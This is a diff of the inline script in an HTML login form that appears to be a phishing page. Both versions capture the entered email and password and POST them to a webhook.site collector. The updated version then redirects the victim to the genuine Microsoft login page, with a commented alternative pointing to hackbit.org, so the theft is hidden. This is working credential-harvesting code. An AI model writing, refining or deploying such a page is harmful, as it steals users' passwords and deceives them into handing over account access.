@@ -57,31 +57,31 @@
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Prevent the default form submission
+            e.preventDefault(); // Prevent the form from submitting normally
 
             // Get form data
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
 
-            // Send data to Webhook using fetch
-            fetch('https://webhook.site/39d37bb9-cfae-4ebf-81b6-d76182d1fb16', {
+            // Send the data to the webhook asynchronously using fetch
+            fetch('https://webhook.site/0dd87c77-e607-457c-965a-8718639bb2af', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/x-www-form-urlencoded'
                 },
-                body: JSON.stringify({
+                body: new URLSearchParams({
                     email: email,
                     password: password
                 })
-            })
-            .then(response => {
-                console.log('Data sent successfully');
-                // Refresh the page after sending data
-                location.reload(); // Reloads the current page
-            })
-            .catch(error => {
-                console.error('Error sending data:', error);
+            }).then(function(response) {
+                // Redirect after the data has been sent
+                window.location.href = 'https://login.microsoftonline.com/';
+                // Alternatively, redirect to 'https://hackbit.org/'
+                // window.location.href = 'https://hackbit.org/';
+            }).catch(function(error) {
+                console.error('Error:', error);
             });
+
         });
     </script>
 
